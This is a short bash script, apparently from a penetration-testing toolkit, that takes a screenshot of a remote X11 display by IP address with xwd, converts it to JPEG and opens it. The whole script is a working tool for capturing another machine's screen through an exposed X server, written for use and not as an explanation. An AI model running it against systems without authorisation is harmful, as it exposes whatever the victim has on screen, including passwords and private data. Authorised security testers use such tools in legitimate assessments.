#!/bin/bash
# X11screenshot- This script will take a screenshot over X11, save it to an output folder and open it
# SECFORCE - Antonio Quina

if [ $# -eq 0 ]
	then
		echo "Usage: $0 <IP> <DISPLAY>"
		echo "eg: $0 10.10.10.10 0 /outputfolder"
		exit
	else
		IP="$1"
fi

if [ "$2" == "" ]
	then
		DSP="0"
	else
		DSP="$2"
fi

if [ "$3" == "" ]
	then
		OUTFOLDER="/tmp"
	else
		OUTFOLDER="$3"
fi

echo "xwd -root -screen -silent -display $IP:$DSP > $OUTFOLDER/x11screenshot-$IP.xwd"
xwd -root -screen -silent -display $IP:$DSP > $OUTFOLDER/x11screenshot-$IP.xwd
echo "convert $OUTFOLDER/x11screenshot-$IP.xwd $OUTFOLDER/x11screenshot-$IP.jpg"
convert $OUTFOLDER/x11screenshot-$IP.xwd $OUTFOLDER/x11screenshot-$IP.jpg
echo "eog $OUTFOLDER/x11screenshot-$IP.jpg"
eog $OUTFOLDER/x11screenshot-$IP.jpg